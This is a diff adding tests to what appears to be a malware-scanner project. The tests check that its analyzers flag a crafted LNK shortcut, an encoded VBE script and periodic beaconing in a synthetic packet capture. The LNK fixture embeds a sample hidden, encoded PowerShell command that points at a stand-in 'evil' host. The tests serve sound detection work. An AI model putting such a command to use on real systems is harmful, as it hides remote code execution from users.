@@ -72,6 +72,46 @@ def test_ios_ipa_type_detection(tmp_path):
     assert fileinfo.inspect(f).file_type == "ios-app"
 
 
+def test_lnk_command_detection(tmp_path):
+    import struct
+    from hawkscan.analyzers.lnk_analyzer import LnkAnalyzer
+    hdr = bytearray(76)
+    hdr[0:4] = (76).to_bytes(4, "little")
+    hdr[4:20] = bytes([0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46])
+    struct.pack_into("<I", hdr, 20, 0x20)
+    data = bytes(hdr) + b"powershell -w hidden -enc AAAA http://evil/x"
+    ctx = _ctx(tmp_path, "x.lnk", data)
+    assert ctx.info.file_type == "lnk"
+    titles = [f.title for f in LnkAnalyzer().analyze(ctx)]
+    assert any("command interpreter" in t for t in titles)
+
+
+def test_vbe_encoder_detection(tmp_path):
+    from hawkscan.analyzers.script_analyzer import ScriptAnalyzer
+    ctx = _ctx(tmp_path, "x.vbe", b"#@~^ABCD==encoded==^#~@")
+    titles = [f.title for f in ScriptAnalyzer().analyze(ctx)]
+    assert any("Encoded script" in t for t in titles)
+
+
+def test_pcap_beaconing_detection(tmp_path):
+    import struct
+    from hawkscan.analyzers.pcap_analyzer import PcapAnalyzer
+
+    def rec(ts):
+        eth = b"\xaa" * 6 + b"\xbb" * 6 + b"\x08\x00"
+        ip = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 40, 1, 0, 64, 6, 0,
+                         bytes([10, 0, 0, 5]), bytes([45, 77, 88, 99]))
+        tcp = struct.pack(">HHIIBBHHH", 44000, 443, 0, 0, 0x50, 2, 0, 0, 0)
+        pkt = eth + ip + tcp
+        return struct.pack("<IIII", ts, 0, len(pkt), len(pkt)) + pkt
+
+    gh = b"\xd4\xc3\xb2\xa1" + struct.pack("<HHIIII", 2, 4, 0, 0, 65535, 1)
+    body = b"".join(rec(1000 + i * 10) for i in range(10))
+    ctx = _ctx(tmp_path, "b.pcap", gh + body)
+    titles = [f.title for f in PcapAnalyzer().analyze(ctx)]
+    assert any("Beaconing" in t for t in titles)
+
+
 def test_ioc_whitelist():
     assert _is_whitelisted("http://schemas.microsoft.com/office")
     assert _is_whitelisted("http://www.w3.org/2000/svg")
